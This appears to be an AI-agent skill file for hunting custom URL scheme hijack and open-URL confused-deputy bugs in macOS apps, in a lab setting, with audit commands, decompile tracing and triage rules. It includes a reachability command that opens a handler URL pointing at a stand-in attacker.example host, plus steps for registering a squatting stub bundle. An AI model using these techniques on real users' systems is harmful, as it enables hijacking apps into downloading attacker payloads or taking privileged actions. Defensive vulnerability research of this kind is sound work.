---
name: offensive-macos-hunt-url-scheme-hijack
description: >-
  Use when auditing macOS apps for custom URL scheme registration and
  inbound URL handling: bundles that claim a scheme via CFBundleURLTypes,
  dispatchers that trust URL host / query without validation, schemes
  that overlap with other apps, apps that take privileged actions in
  application:openURL:. Fires on "url scheme hijack", "openURL handler
  audit", "cfbundleurlschemes", "deep link bypass".
folder: offensive-macos-hunt-url-scheme-hijack
source: skillz-wave6
trigger_phrases:
  - "url scheme hijack"
  - "openURL handler audit"
  - "cfbundleurlschemes"
  - "deep link bypass"
---

# Hunt: custom URL scheme hijack / open-URL confused deputy

> Channel boundary: `REPO_MODE=analysis`.

## When to use

The target's `Info.plist` declares `CFBundleURLTypes` with `CFBundleURLSchemes`. The target implements `application:openURL:` / `application:openURLs:` / `handleURL:` / `getUrl:withReplyEvent:`. The target is invoked indirectly: links in email, documents, web pages, or other apps drive it via `open <url>` or `LSOpen*`. A privileged installer takes a URL parameter from configuration and routes it through `CFURLCreateWithString` to an action.

## Lab topology

| Step | Surface | How |
|---|---|---|
| Static sweep | lab host | `ghidra-mcp` + `~/ghidra-scripts/scan_url_scheme_handlers.py` |
| Bundle audit | workstation | `defaults read /Applications/<App>.app/Contents/Info.plist CFBundleURLTypes` |
| LaunchServices state | lab host | `lsregister -dump \| grep -A 4 <bundle-id>` |
| Handler decompile | lab host | `decomp.function` on each tier-B `open_url_handler_impl` |
| Reachability harness | crash-test | `open '<scheme>://...'` from a low-privilege user |
| Evidence | findings repo | TSVs + log captures under `artifacts/`, hash-pinned |

## What the bug class is

A URL scheme handler is a confused-deputy primitive. An external party (web page, document, email) drives an internal action in the registered app. The bug class is the dispatcher trusting the URL too much.

Three shapes:

Trusted parameter passing. The dispatcher reads a URL query parameter (file path, server URL, command name, login token) and acts on it without authorization or validation. Updater handler that takes `?url=https://attacker.example/payload` and downloads from it.

Scheme squatting. Multiple apps claim the same scheme; LaunchServices picks one. An attacker who installs a bundle claiming a privileged scheme can intercept URLs intended for the legitimate app.

Sandbox-equivalent capability via URL. Sandboxed code uses `open <url>` or `[NSWorkspace openURL:]` to ask another app to do something the sandboxed code itself cannot. If that other app's handler doesn't validate the requesting party, sandbox is effectively transparent.

The invariant: every privileged action gated by an inbound URL must verify the caller (responsible-process attribution) and validate the URL's host / path / query against an explicit allowlist.

## Anchor pattern

Strong: tier-A `ls_set_default_handler_callsite` with `scheme=` recovered. The app registered itself for that scheme. Pair with the `Info.plist` to know if it's the default or just a handler.

Strong: tier-A `application_openurl_callsite` (objc dispatch) and tier-B `open_url_handler_impl` rows. Each is a function the system calls when a URL arrives. Decompile every one.

Strong: tier-C `url_scheme_string` rows where the scheme is unusual (vendor-specific, single word, conflicts with a well-known iOS scheme). Schemes like `app-config://` or `update://` are louder signals than `https://` or `http://`.

Medium: tier-A `cfurl_create_with_string_callsite` with `url=` recovered. The app constructs URLs at runtime; check who controls the construction inputs.

Weak: tier-C `cfbundle_url_key_string` rows alone. Means the binary references the URL-types plist machinery; could be reading it for any reason.

## Harness

Open the target and run the scan. Read the bundle-side declaration:

```bash
plutil -p /Applications/<App>.app/Contents/Info.plist | grep -A 8 CFBundleURLTypes
```

For each tier-B `open_url_handler_impl` row, decompile and trace:

```
inbound URL
  -> scheme switch        (which schemes does the dispatcher accept?)
    -> host / path / query parse
      -> action selection (download | exec | login | spawn)
        -> destination    (which file / network / process?)
          -> validation   (allowlist | code-signed origin | none)
```

Build a (scheme, action, validation) inventory. Anywhere validation is "none" or weaker than the action's privilege, you have a candidate.

## Reachability

```bash
# drive the handler from a low-privilege user; observe
open 'examplescheme://action?url=https://attacker.example/'

# what did the app do?
log stream --style compact \
  --predicate 'process == "<App>" AND eventMessage CONTAINS "openURL"'
```

For scheme squatting, register a stub bundle claiming the same scheme on a crash-test VM:

```bash
defaults write com.example.stub CFBundleURLTypes \
  -array '{ CFBundleURLName = stub; CFBundleURLSchemes = ( examplescheme ); }'
# place a minimal app bundle at /Applications/Stub.app and let LaunchServices index it
lsregister -kill -r -domain local -domain user
```

Snapshot first. LaunchServices state is fiddly to clean up.

## Triage

Enumerate every scheme the bundle claims (from `Info.plist`) and every scheme it constructs URLs for (from `cfurl_create_with_string_callsite`). For each scheme, identify the dispatcher in `application:openURL:` / `application:openURLs:`. Trace each privileged action that depends on URL contents.

Promote to `escalated` only when an externally driven URL can reach a privileged action without validation. Confirm with the reachability harness on the crash-test VM.

## Pitfalls

LaunchServices is a black box. Which app handles a scheme depends on `lsregister` state that is not solely determined by `Info.plist`; it tracks last-installed-wins and user choices. A scheme-squatting test on one machine may not reproduce on another.

`open` is not the only entry point. `NSWorkspace openURL:`, `LSOpenCFURLRef`, `LSOpenFromURLSpec`, `[NSAppleEventManager getURL:]` all hit the handler. Check all of them.

App Sandbox doesn't stop URL dispatch. A sandboxed origin app can still invoke `open <url>`; sandbox controls what the origin app does, not what other apps do on its behalf.

Universal Links / Associated Domains are a different code path on macOS 10.15+ and use HTTPS. Custom schemes still exist and still ship in many apps.

Quoting and encoding bugs. A handler that splits the URL string by `&` or unquotes early may be vulnerable to encoding tricks the URL parser library would not have allowed.

## Public anchors

Wojciech Reguła's research on macOS / iOS URL schemes (SecuRing posts). Multiple iOS-derived URL-handler bugs that ported to Catalyst / Mac apps. Vendor-specific URL handler bugs disclosed by individual researchers across 2020–2024.

## See also

- `Skills/offensive-macos-family-tcc-heavy-apps/SKILL.md`
- `Skills/offensive-macos-electron-surface-pack/SKILL.md`
- `Skills/offensive-macos-hunt-private-framework-hijack/SKILL.md`
- `Skills/offensive-macos-hunt-wrong-door/SKILL.md`
- `ghidra-scripts/scan_url_scheme_handlers.py`
